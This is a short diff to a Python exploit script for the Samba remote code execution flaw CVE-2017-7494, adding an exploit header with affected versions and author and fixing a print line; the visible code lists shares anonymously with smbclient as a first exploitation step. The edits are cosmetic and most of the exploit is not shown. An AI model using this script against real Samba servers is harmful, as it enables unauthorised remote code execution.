@@ -1,4 +1,12 @@
-#coding=utf-8
+# coding=utf-8
+# Exploit Title: Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
+# Date: 2017-05-31
+# Exploit Author: avfisher (https://github.com/brianwrf/SambaHunter)
+# Vendor Homepage: https://www.samba.org/
+# Software Link: https://www.samba.org/samba/download/
+# Version: 3.5.0 - 4.5.4/4.5.10/4.4.14
+# Tested on: Ubuntu 16.04
+# CVE : CVE-2017-7494
 
 import commands
 import sys
@@ -119,7 +127,7 @@ def main():
         cmd = args.command
 
     if server and cmd:
-        print "[*] Exploiting RCE for Samba (CVE-2017-7494 )..."
+        print "[*] Exploiting RCE for Samba (CVE-2017-7494)..."
         print "[*] Server: %s" % server
         list_share_cmd = "smbclient -L %s -N" % (server)
         (status, output) = commands.getstatusoutput(list_share_cmd)
